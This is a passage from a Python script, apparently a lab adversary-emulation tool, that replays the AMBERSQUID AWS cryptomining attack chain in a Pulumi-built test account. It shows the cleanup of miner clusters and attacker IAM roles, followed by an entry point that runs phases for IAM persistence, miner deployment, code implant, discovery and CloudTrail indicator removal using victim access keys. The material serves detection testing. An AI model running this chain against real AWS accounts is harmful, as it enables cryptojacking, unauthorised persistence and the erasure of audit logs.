                for td_arn in page.get("taskDefinitionArns", []):
                    try:
                        ecs_v.deregister_task_definition(taskDefinition=td_arn)
                        print_ok(f"DeregisterTaskDefinition {td_arn}")
                    except ClientError as inner_e:
                        print_err(f"  DeregisterTaskDefinition {td_arn}: {inner_e}")
        except ClientError as e:
            print_err(f"ListTaskDefinitions {td_family}: {e}")

    print_step("Cleanup 7: Delete ECS cluster miner-cluster")
    try:
        ecs_v.delete_cluster(cluster="miner-cluster")
        print_ok("ECS DeleteCluster -> miner-cluster")
    except ClientError as e:
        code = e.response["Error"]["Code"]
        if code == "ClusterNotFoundException":
            print_ok("ECS cluster miner-cluster not found -- skipping")
        else:
            print_err(f"ECS DeleteCluster: {e}")

    print_step("Cleanup 8: Detach policies and delete attacker IAM roles")
    for role_name in ["AWSCodeCommit-Role", "sugo-role", "ecsTaskExecutionRole"]:
        try:
            attached = iam.list_attached_role_policies(RoleName=role_name)
            for policy in attached.get("AttachedPolicies", []):
                iam.detach_role_policy(
                    RoleName=role_name, PolicyArn=policy["PolicyArn"]
                )
                print_ok(f"  DetachRolePolicy {role_name} <- {policy['PolicyName']}")
        except ClientError as e:
            code = e.response["Error"]["Code"]
            if code == "NoSuchEntityException":
                print_ok(f"  Role {role_name} not found -- skipping detach")
                continue
            else:
                print_err(f"  ListAttachedRolePolicies {role_name}: {e}")
                continue
        try:
            iam.delete_role(RoleName=role_name)
            print_ok(f"DeleteRole -> {role_name}")
        except ClientError as e:
            print_err(f"DeleteRole {role_name}: {e}")

    print_step(f"Cleanup 9: Delete CodeCommit repo '{ct_repo_name}' in us-west-2")
    try:
        cc_west_cl = (codecommit_session or victim_session).client(
            "codecommit", region_name="us-west-2"
        )
        cc_west_cl.delete_repository(repositoryName=ct_repo_name)
        print_ok(f"CodeCommit DeleteRepository -> {ct_repo_name} (us-west-2)")
    except ClientError as e:
        code = e.response["Error"]["Code"]
        if code == "RepositoryDoesNotExistException":
            print_ok(f"CodeCommit repo '{ct_repo_name}' not found in us-west-2 -- skipping")
        else:
            print_err(f"CodeCommit DeleteRepository us-west-2: {e}")


# ---------------------------------------------------------------------------
# Backend entry point
# ---------------------------------------------------------------------------

def run(outputs: dict, region: str = "us-east-1") -> None:
    """MayaTrail backend entry point. `outputs` is the Pulumi stack output dict."""
    print("\n" + "#"*60)
    print("# AMBERSQUID Adversary Emulation -- attack.py")
    print("# 13-step / 11-phase kill chain")
    print("#"*60)

    victim_key_id = outputs.get("victim_access_key_id") or os.environ.get("AWS_VICTIM_ACCESS_KEY_ID")
    victim_secret = outputs.get("victim_secret_access_key") or os.environ.get("AWS_VICTIM_SECRET_ACCESS_KEY")

    if not victim_key_id or not victim_secret:
        print_err(
            "Victim credentials not found. "
            "Ensure Pulumi stack exports 'victim_access_key_id' and 'victim_secret_access_key'."
        )
        raise SystemExit(1)

    cluster_name       = outputs.get("cluster_name") or outputs.get("ecs_cluster_name", "ambersquid-cluster")
    trail_name         = outputs.get("trail_name") or outputs.get("cloudtrail_trail_name", "ambersquid-trail")
    task_family        = outputs.get("task_family", "ambersquid-miner")
    log_bucket_name    = outputs.get("cloudtrail_bucket_name", "")
    ct_repo_name       = outputs.get("codecommit_repo_name", "test")
    honey_user_name    = outputs.get("honey_user_name", "prod-deploy-svc")
    canary_secret_name = outputs.get("canary_secret_name", "prod/database/master_credentials")
    subnet_id_val      = outputs.get("subnet_id", "") or os.environ.get("ECS_SUBNET_ID", "")
    task_sg_id_val     = outputs.get("task_sg_id", "") or os.environ.get("ECS_SECURITY_GROUP_ID", "")

    victim_session = make_session(victim_key_id, victim_secret, region=region)

    task_arn           = None
    account_id         = ""
    codecommit_session = None
    sugo_session       = None
    ecs_exec_session   = None

    try:
        phase_resource_development()
        phase_delay()

        task_arn = phase_initial_execution(
            cluster_name, task_family, subnet_id_val, task_sg_id_val, region=region
        )
        phase_delay()

        account_id = phase_credential_validation(victim_session)
        if not account_id:
            print_err("Could not resolve account_id -- some phases may fail")
            account_id = ""
        phase_delay()

        codecommit_session, sugo_session, ecs_exec_session = phase_persistence_iam(
            victim_session, account_id
        )
        phase_delay()

        phase_miner_deployment(
            codecommit_session, sugo_session, ecs_exec_session, account_id, ct_repo_name
        )
        phase_delay()

        phase_code_implant(codecommit_session, ct_repo_name)
        phase_delay()

        phase_discovery(victim_session, account_id, honey_user_name, canary_secret_name)
        phase_delay()

        phase_container_deployment(ecs_exec_session, account_id)
        phase_delay()

        phase_compute_scaling(victim_session)
        phase_delay()

        phase_indicator_removal(
            victim_session, codecommit_session, account_id, trail_name, log_bucket_name
        )
        phase_delay()

        phase_resource_hijacking(victim_session, task_arn, cluster_name)

    finally:
        post_attack_cleanup(
            victim_session,
            codecommit_session,
            sugo_session,
            task_arn,
            trail_name,
            cluster_name,
            ct_repo_name,
        )

    print("\n[+] AMBERSQUID emulation complete.")


if __name__ == "__main__":
    import json
    _outputs = json.loads(sys.argv[1]) if len(sys.argv) > 1 else {}
    _region  = sys.argv[2] if len(sys.argv) > 2 else "us-east-1"
    run(_outputs, _region)
